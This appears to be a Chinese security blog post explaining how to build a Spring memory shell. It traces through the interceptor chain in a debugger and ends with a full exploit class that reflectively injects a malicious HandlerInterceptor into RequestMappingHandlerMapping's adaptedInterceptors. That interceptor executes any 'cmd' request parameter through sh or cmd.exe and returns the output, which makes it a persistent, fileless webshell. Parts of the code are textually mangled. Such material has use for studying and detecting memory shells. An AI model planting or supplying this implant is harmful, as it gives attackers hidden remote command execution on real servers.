#  spring内存马-Interceptor构造   
 轩公子谈技术   2025-06-05 01:53  
  
# spring内存马-Interceptor构造  
- ## 环境搭建  
  
方便调试代码，创建一个自定义的  
Interceptor筛选器  
  
  
import org.springframework.web.bind.annotation.*;              
  
import org.springframework.web.servlet.*;              
  
import org.springframework.web.servlet.config.annotation.*;              
  
import javax.servlet.http.*;              
  
  
@RestController              
  
public class CmdController implements WebMvcConfigurer {              
  
  
      
// 控制器方法 - 处理/index请求              
  
      
@GetMapping("/index")              
  
      
public String index(@RequestParam String cmd) {              
  
          
System.out.println("执行命令: " + cmd);              
  
          
return "命令执行成功: " + cmd;              
  
      
}              
  
  
      
// 注册拦截器              
  
      
@Override              
  
      
public void addInterceptors(InterceptorRegistry registry) {              
  
          
registry.addInterceptor(new HandlerInterceptor() {              
  
              
@Override              
  
              
public boolean preHandle(HttpServletRequest request,              
  
                                       
HttpServletResponse response,              
  
                                       
Object handler) throws Exception {              
  
                  
// 检查cmd参数              
  
                  
if (request.getParameter("cmd") == null) {              
  
                      
response.getWriter().write("缺少cmd参数");              
  
                      
return false; // 阻止请求              
  
                  
}              
  
                  
return true; // 允许请求              
  
              
}              
  
          
}).addPathPatterns("/index"); // 只拦截/index              
  
      
}              
  
}              
  
  
  
pom.xml文件配置springboot依赖项:  
  
  
  org.springframework  spring-web  5.3.16  
  
- ## 调试分析  
  
在输出位置打个断点,  
分析一下Interceptor是怎么执行了  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BAby4Fk1HQbxbyvttH4OLKM7ApkD726RX5bVZAZk0q7C8QHmSXZZ1m5TQvkpzfR8dHBeOicH3CJEZAuzeVVb1fQ/640?wx_fmt=png "")  
  
  
  
  
在HandlerExecutionChain#applyPreHandle方法中，interceptor对应我们自定义的  
筛选器，this.interceptorList是个集合存储着所有的筛选器  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BAby4Fk1HQbxbyvttH4OLKM7ApkD726RialEDEMDicVjoSHP46uc7QEicDiciaGQj1ul4UGbhbVbmvgc8Tf5BnqaQpw/640?wx_fmt=png "")  
  
  
  
  
具体查看HandlerExecutionChain#applyPreHandle代码，  
简单来说循环this.interceptorList集合里的每一个  
对象赋值给HandlerInterceptor对象，然后调用  
interceptor的  
preHandle()  
 方法  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BAby4Fk1HQbxbyvttH4OLKM7ApkD726R9d1KvO9KemHgVygBOgriabTCZrmSddb4u8DrLCqwCicB96vAZNibsXfhw/640?wx_fmt=png "")  
  
  
  
  
要搞清楚  
this.interceptorList集合是怎么来的，继续查看一下堆栈  
DispatcherServlet#doDispatch  
，在  
mappedHandler中存储着  
interceptorList集合，查看代码，搞清楚这个mappedHandler是哪来的  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BAby4Fk1HQbxbyvttH4OLKM7ApkD726RVcWzEnm5SawSib7GdMKmmFHRc6gHCoM1PWr1Uf0nq2kl2aSe3QyjdGQ/640?wx_fmt=png "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BAby4Fk1HQbxbyvttH4OLKM7ApkD726RArCI3y5UDREShUHY8mfcdbz5aD8SIibqVbJxgVChV2kmXZtEbzzWFibA/640?wx_fmt=png "")  
  
  
  
  
我们进入这个this.getHandler(processedRequest);看看  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BAby4Fk1HQbxbyvttH4OLKM7ApkD726Rib4hiaxFJGzZlFfOYxpq3kbBpsFU1iaiasAnehv8mEauh415ibn1xyX42QQ/640?wx_fmt=png "")  
  
  
  
  
看看见handlerMappings的内容不一样，我们打开看看，这里面有五个handlerMappings对象，每个对象都有我们的拦截器，那肯定这里是关键地方，能最终筛选出合适的拦截器  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BAby4Fk1HQbxbyvttH4OLKM7ApkD726RnIUibo8EsHATib6fR6Rb7UJjvdYVwpsdz2gNLPDgAyOJSQibvpOZAPKCA/640?wx_fmt=png "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BAby4Fk1HQbxbyvttH4OLKM7ApkD726R8RsVvhh4I1fKcTeNuPtShUQtcnFrMVdKSkIvTJk0gszNw1pibqibichibg/640?wx_fmt=png "")  
  
  
  
  
在这遍历出了每个对象，如果能获取到的handler就返回，跟进去看一下这个mapping.getHandler(request);都做什么，在这里打个断点分析下  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BAby4Fk1HQbxbyvttH4OLKM7ApkD726Rym68ScpcLibicvyuDhMM0Qs1F05Z0Dffw8X7WGsAaEqkc2lHX2zcCzhA/640?wx_fmt=png "")  
  
  
  
  
持续跟进发现最终调用的是AbstractHandlerMapping#getHandler()，该方法中调用了getHandlerExecutionChain()  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BAby4Fk1HQbxbyvttH4OLKM7ApkD726RliaNviav6fDz9hiaTia1uDsS3dSXrKAzorH9pS3iaxMTLzzAL9IIUgFTcvQ/640?wx_fmt=png "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BAby4Fk1HQbxbyvttH4OLKM7ApkD726R35tSosW72fI6QamNjic2MjTK1T260VUjx9r82WRQ4XLIl6M76RRpnrw/640?wx_fmt=png "")  
  
  
  
  
跟进getHandlerExecutionChain()方法，  
创建了一个新的Chain，  
从adaptedInterceptors中把符合的拦截器添加到chain里。  
  
  
adaptedInterceptors一开始就存放了全部拦截器  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BAby4Fk1HQbxbyvttH4OLKM7ApkD726RxuPR0yRVCiciaBGxy8TQ58g0v02d7zCc9YhvZ9dHTn8TwCuKNM4pI3sg/640?wx_fmt=png "")  
  
  
  
  
再跟进chain.addInterceptor方法，就是将拦截器添加  
this.interceptorList集合里  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BAby4Fk1HQbxbyvttH4OLKM7ApkD726R6A0m4rNWAjKCibibOWhicGib2TFmNgkyXNnaBz8uZSqrNcAiby6Lsiaib0VsA/640?wx_fmt=png "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BAby4Fk1HQbxbyvttH4OLKM7ApkD726Rhkn716OhXSnnjWzfOHfq8WQu1iawU7ib8BHWbD55c9J3g25icoqTnK5GA/640?wx_fmt=png "")  
  
  
  
  
返回到DispatcherServlet#doDispatch()，getHandler后执行了applyPreHandle遍历执行了拦截器。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BAby4Fk1HQbxbyvttH4OLKM7ApkD726RsHV4MuGyhYflx0XFnb7uiao6ibVuQkJucsYaFT1kUDUGzymvkFlp5tnQ/640?wx_fmt=png "")  
  
  
  
  
总结一下，我们只需要获取AbstractHandlerMapping#adaptedInterceptors，把我们的拦截器添加进去就可以了  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BAby4Fk1HQbxbyvttH4OLKM7ApkD726RfYGuVmvSPiaeMRNqtcOLuTNPEdpQOQEMZZicwPzCHtXnfOaawHFpwp6Q/640?wx_fmt=png "")  
  
  
  
  
注册  
Interceptor拦截器过程：  
  
  
获取WebApplicationContext  
  
  
获取AbstractHandlerMapping对象  
  
  
通过反射获取AbstractHandlerMapping#adaptedInterceptors  
  
  
新建恶意拦截器  
  
  
AbstractHandlerMapping#adaptedInterceptors添加恶意拦截器  
- ## 内存马编写  
  
### 获取RequestMappingHandlerMapping  
  
  
//获取RequestMappingHandlerMapping              
  
WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);              
  
RequestMappingHandlerMapping bean = context.getBean(RequestMappingHandlerMapping.class);              
  
### 反射获取AbstractHandlerMapping#adaptedInterceptors  
  
  
try {              
  
//通过反射AbstractHandlerMapping类获取adaptedInterceptors属性              
  
      
Field field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");              
  
      
field.setAccessible(true);              
  
      
Listinterceptors = (List) field.get(bean);            //添加恶意Interceptors            interceptors.add(new shsellInterceptor());            } catch (NoSuchFieldException e) {                throw new RuntimeException(e);            }          
### 添加恶意Interceptors  
  
  
interceptors.add(new shsellInterceptor());              
  
  
  
恶意Interceptor:需要实现HandlerInterceptor接口，通过重写preHandle进行RCE  
  
  
      
public  
    
class  
shsellInterceptor  
implementsHandlerInterceptor {              
  
          
@Override              
  
          
public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {              
  
              
if (request.getParameter("cmd") != null) {              
  
                  
try {              
  
                      
boolean isLinux = true;              
  
                      
String osTyp = System.getProperty("os.name");              
  
                      
if (osTyp != null && osTyp.toLowerCase().contains("win")) {              
  
                      
isLinux = false;              
  
                      
}              
  
                      
String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};              
  
                      
InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();              
  
                      
Scanner s = new Scanner(in).useDelimiter("\\A");              
  
                      
String output = s.hasNext() ? s.next() : "";              
  
                      
response.getWriter().write(output);              
  
                      
response.getWriter().flush();              
  
                      
response.getWriter().close();              
  
                  
} catch(Exception e){              
  
                  
e.printStackTrace();              
  
                  
}              
  
                  
return false;              
  
              
}              
  
              
return true;              
  
          
}              
  
  
  
          
@Override              
  
          
public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable ModelAndView modelAndView) throws Exception {              
  
          
}              
  
  
          
@Override              
  
          
public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable Exception ex) throws Exception {              
  
          
}              
  
      
}              
  
  
  
完整的EXP:  
  
  
port jdk.internal.dynalink.beans.StaticClass;              
  
import org.springframework.lang.Nullable;              
  
import org.springframework.stereotype.Controller;              
  
import org.springframework.web.bind.annotation.RequestMapping;              
  
import org.springframework.web.context.WebApplicationContext;              
  
import org.springframework.web.context.request.RequestContextHolder;              
  
import org.springframework.web.servlet.HandlerInterceptor;              
  
import org.springframework.web.servlet.ModelAndView;              
  
import org.springframework.web.servlet.handler.AbstractHandlerMapping;              
  
  
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;              
  
  
import javax.servlet.http.HttpServletRequest;              
  
import javax.servlet.http.HttpServletResponse;              
  
import java.io.BufferedReader;              
  
import java.io.IOException;              
  
import java.io.InputStream;              
  
  
import java.io.InputStreamReader;              
  
import java.lang.reflect.Field;              
  
import java.util.List;              
  
import java.util.Scanner;              
  
  
import static sun.font.FontUtilities.isLinux;              
  
  
public class InjectInterceptor implements HandlerInterceptor {              
  
  
      
static {              
  
  
          
//获取RequestMappingHandlerMapping 的实例              
  
          
WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);              
  
          
RequestMappingHandlerMapping bean = context.getBean(RequestMappingHandlerMapping.class);              
  
          
try {              
  
              
//通过反射AbstractHandlerMapping类获取adaptedInterceptors属性              
  
              
Field field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");              
  
              
field.setAccessible(true);              
  
              
Listinterceptors = (List) field.get(bean);                    //添加恶意Interceptors                    interceptors.add(new InjectInterceptor());                    System.out.println("[+] /shell Interceptor injected.");                } catch (NoSuchFieldException | IllegalAccessException e) {                    throw new RuntimeException(e);                }            }                //重构Interceptors类            @Override            public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {                if (request.getParameter("cmd") != null) {                    try {                        boolean isLinux = true;                        String osTyp = System.getProperty("os.name");                        if (osTyp != null && osTyp.toLowerCase().contains("win")) {isLinux = false;                        }                        String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();                        Scanner s = new Scanner(in).useDelimiter("\\A");                        String output = s.hasNext() ? s.next() : "";                        response.getWriter().write(output);                        response.getWriter().flush();                        response.getWriter().close();                    } catch(Exception e){                        e.printStackTrace();                    }                    return false;                }                return true;            }            @Override            public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable ModelAndView modelAndView) throws Exception {            }            @Override            public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable Exception ex) throws Exception {            }        
  
  
  
  
  
  
  
   
  
